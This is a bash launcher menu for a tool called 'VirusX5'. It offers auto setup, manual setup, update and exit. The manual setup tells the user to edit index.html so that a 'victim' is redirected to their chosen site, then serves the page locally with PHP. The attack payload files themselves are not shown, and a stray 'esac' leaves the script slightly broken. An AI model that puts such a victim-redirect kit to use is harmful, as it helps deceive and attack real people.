#!/bin/bash
#Script starts here


#Colours
red='\e[1;31m'
blue='\e[34m'
grn='\e[1;92m'
cyan='\e[1;36m'
end='\e[0m'

clear
#Intro
echo -e "$cyan
                  ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗██╗  ██╗███████╗
                  ██║   ██║██║██╔══██╗██║   ██║██╔════╝╚██╗██╔╝██╔════╝
                  ██║   ██║██║██████╔╝██║   ██║███████╗ ╚███╔╝ ███████╗
                  ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║ ██╔██╗ ╚════██║
                   ╚████╔╝ ██║██║  ██║╚██████╔╝███████║██╔╝ ██╗██ v 1.0
                    ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝$end"
echo 
echo -e "$grn                            Coded By$red Zaeem Technical  $end"
echo -e "$grn                            Instagram:-$cyan zaeem_technical19 $end"
echo -e "$grn                            Youtube:-$cyan https://m.youtube.com/zaeemtechnical $end"
echo -e "$grn                            Website:- https://zaeemtechnical.ml $end"
echo "   "
sleep 2
echo 

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Auto Setup (Activated Now)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Manual Setup\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option

if [[ $option == 1 || $option == 01 ]]; then 
echo 
echo -e "$grn                  Auto Setup is Under Development May be Not Work properly $end"
sleep 5.7
clear
# cd $HOME/VirusX5/main
python3 host.py
elif [[ $option == 2 || $option == 02 ]]; then
echo -e "$grn READ THE FOLLOWING STEPS $end"
echo -e "$grn I highlighted the code where you replace my Website name to your website link where you wanted to redirect your victim $end"
echo -e "$cyan my website: https://www.zaeemtechnical.ml $end"

sleep 10
cd $HOME/VirusX5/host
nano index.html
cd $HOME/VirusX5/host
php -S localhost:8080
elif [[ $option == 3 || $option == 03 ]]; then
cd $HOME/VirusX5/main
chmod +x *
python3 update.py


elif [[ $option == 4 || $option == 04 ]]; then
echo 
echo -e "$grn                                THANKS FOR USING OUR TOOL $end"
echo 
clear && cd
else
echo
printf "\e[1;93m [>!<] Invalid Selection!\e[0m\n"
sleep 1
echo
fi
exit
clear && cd

esac
